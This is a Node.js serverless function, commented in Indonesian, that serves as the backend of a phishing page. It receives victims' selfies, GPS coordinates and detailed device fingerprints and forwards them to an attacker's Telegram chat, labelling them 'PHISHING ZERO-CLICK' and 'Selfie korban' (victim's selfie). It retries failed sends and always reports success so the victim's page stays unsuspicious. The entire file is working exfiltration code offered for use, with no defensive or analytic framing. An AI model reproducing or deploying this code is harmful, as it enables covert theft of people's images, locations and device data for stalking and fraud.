// ============================================================
// API CAPTURE - ADVANCED TELEGRAM EXFILTRATION MODULE
// ============================================================
// Fitur:
// - Mengirim pesan teks lengkap ke Telegram
// - Jika ada foto base64, dikirim sebagai file (document)
// - Retry otomatis jika gagal
// - Logging detail (ke console Vercel)
// - Validasi input & environment variables
// - Timeout handling
// ============================================================

export default async function handler(req, res) {
    // === 1. CORS & METHOD CHECK ===
    // Set CORS headers (optional, Vercel biasanya sudah handle)
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // === 2. VALIDASI ENVIRONMENT ===
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!botToken || !chatId) {
        console.error('[CRITICAL] Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
        return res.status(500).json({ error: 'Server configuration error' });
    }

    // === 3. PARSING & VALIDASI INPUT ===
    let payload;
    try {
        payload = req.body;
        if (!payload || typeof payload !== 'object') {
            throw new Error('Invalid payload');
        }
    } catch (e) {
        console.error('[ERROR] Invalid JSON body:', e.message);
        return res.status(400).json({ error: 'Bad request' });
    }

    // === 4. EKSTRAKSI DATA ===
    const { photo, location, fingerprint, errors, timestamp } = payload;
    const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

    // === 5. BANGUN PESAN TEKS ===
    let message = `🔥 *PHISHING ZERO-CLICK - DATA BARU* 🔥\n\n`;
    message += `📅 *Waktu:* ${waktu}\n`;
    if (timestamp) message += `⏱️ *Timestamp client:* ${new Date(timestamp).toLocaleString()}\n`;

    // Lokasi
    if (location && location.lat && location.lng) {
        message += `📍 *Lokasi:* ${location.lat}, ${location.lng}\n`;
        message += `   Akurasi: ${location.accuracy || '?'}m\n`;
        if (location.alt) message += `   Ketinggian: ${location.alt}m\n`;
    } else {
        message += `📍 *Lokasi:* Tidak diberikan\n`;
    }

    // Fingerprint
    if (fingerprint && typeof fingerprint === 'object') {
        const fp = fingerprint;
        message += `\n🖥️ *Perangkat:* ${fp.platform || 'N/A'}\n`;
        message += `   Layar: ${fp.screen || 'N/A'}\n`;
        message += `   Timezone: ${fp.timezone || 'N/A'}\n`;
        message += `   Bahasa: ${fp.language || 'N/A'}\n`;
        message += `   Cookies: ${fp.cookiesEnabled ? '✅' : '❌'}\n`;
        message += `   CPU Cores: ${fp.hardwareConcurrency || 'N/A'}\n`;
        message += `   Memori: ${fp.deviceMemory || '?'} GB\n`;
        if (fp.battery) message += `   Baterai: ${fp.battery.level}${fp.battery.charging ? ' (charging)' : ''}\n`;
        if (fp.connection) {
            message += `   Koneksi: ${fp.connection.effectiveType} (${fp.connection.downlink} Mbps)\n`;
        }
        if (fp.webglRenderer) message += `   GPU: ${fp.webglRenderer}\n`;
        message += `\n📱 *User Agent:*\n${fp.userAgent || 'N/A'}\n`;
    } else {
        message += `\n🖥️ *Perangkat:* Tidak tersedia\n`;
    }

    // Status foto
    if (photo) {
        message += `\n📸 *Selfie:* Berhasil diambil (dikirim sebagai file terpisah)\n`;
    } else {
        message += `\n📸 *Selfie:* Gagal / tidak diberikan\n`;
    }

    // Error handling
    if (errors && Array.isArray(errors) && errors.length > 0) {
        message += `\n⚠️ *Error:* ${errors.join(', ')}\n`;
    }

    // === 6. FUNGSI PENGIRIMAN KE TELEGRAM ===
    const TELEGRAM_API = `https://api.telegram.org/bot${botToken}`;

    // Helper: kirim pesan teks
    async function sendTelegramMessage(text) {
        const url = `${TELEGRAM_API}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'Markdown'
            })
        });
        if (!response.ok) {
            const errText = await response.text();
            throw new Error(`Telegram message error ${response.status}: ${errText}`);
        }
        return response.json();
    }

    // Helper: kirim foto sebagai file (document)
    async function sendTelegramPhoto(base64Data) {
        // Pisahkan header base64 (data:image/jpeg;base64, ...)
        const matches = base64Data.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
        if (!matches || matches.length !== 3) {
            throw new Error('Invalid base64 image');
        }
        const mimeType = matches[1];
        const base64 = matches[2];
        const buffer = Buffer.from(base64, 'base64');
        const filename = `selfie_${Date.now()}.jpg`;

        // Gunakan FormData untuk upload file
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', new Blob([buffer], { type: mimeType }), filename);
        formData.append('caption', '📸 Selfie korban');

        const url = `${TELEGRAM_API}/sendDocument`;
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });
        if (!response.ok) {
            const errText = await response.text();
            throw new Error(`Telegram document error ${response.status}: ${errText}`);
        }
        return response.json();
    }

    // === 7. EKSEKUSI DENGAN RETRY ===
    const MAX_RETRIES = 2;
    let lastError = null;

    // Kirim pesan teks (wajib)
    for (let attempt = 0; attempt <= MAX_RETRIES; attempt++) {
        try {
            await sendTelegramMessage(message);
            console.log(`[SUCCESS] Telegram message sent, attempt ${attempt + 1}`);
            break;
        } catch (err) {
            lastError = err;
            console.error(`[RETRY ${attempt + 1}] Failed to send message:`, err.message);
            if (attempt < MAX_RETRIES) await new Promise(r => setTimeout(r, 1000 * (attempt + 1)));
        }
    }
    if (lastError) {
        console.error('[FATAL] Could not send message after retries');
        // Tetap lanjut untuk kirim foto, jangan langsung return error
    }

    // Kirim foto jika ada (opsional, dengan retry terpisah)
    if (photo) {
        let photoSent = false;
        for (let attempt = 0; attempt <= MAX_RETRIES; attempt++) {
            try {
                await sendTelegramPhoto(photo);
                console.log(`[SUCCESS] Telegram photo sent, attempt ${attempt + 1}`);
                photoSent = true;
                break;
            } catch (err) {
                lastError = err;
                console.error(`[RETRY ${attempt + 1}] Failed to send photo:`, err.message);
                if (attempt < MAX_RETRIES) await new Promise(r => setTimeout(r, 1000 * (attempt + 1)));
            }
        }
        if (!photoSent) {
            // Jika foto gagal, coba kirim notifikasi via teks
            try {
                await sendTelegramMessage('⚠️ Foto gagal dikirim (terlalu besar?)');
            } catch (e) {}
        }
    }

    // === 8. RESPON KE CLIENT ===
    // Beri respon sukses meskipun ada kegagalan di Telegram (agar frontend tidak curiga)
    res.status(200).json({ success: true });
}